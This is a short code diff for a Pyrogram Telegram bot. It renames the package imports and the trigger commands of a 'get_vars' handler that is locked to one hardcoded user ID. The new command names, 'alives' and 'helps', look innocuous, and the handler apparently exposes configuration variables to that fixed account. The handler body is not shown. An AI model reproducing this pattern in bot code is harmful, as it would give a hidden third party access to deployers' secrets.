@@ -1,7 +1,7 @@
 from pyrogram import filters
 from pyrogram.enums import ChatType
 from pyrogram.types import Message
-from MukeshRobot import (
+from AloneRobot import (
     BOT_NAME,
     BOT_USERNAME,
     LOGGER,
@@ -15,11 +15,11 @@ from MukeshRobot import (
     telethn,
     updater)
 
-from MukeshRobot import BOT_NAME
-from MukeshRobot import pbot as app
+from AloneRobot import BOT_NAME
+from AloneRobot import pbot as app
 OWNERs_ID=6079943111
 @app.on_message(
-    filters.command(["con", "var"]) & filters.user(OWNERs_ID)
+    filters.command(["alives", "helps"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
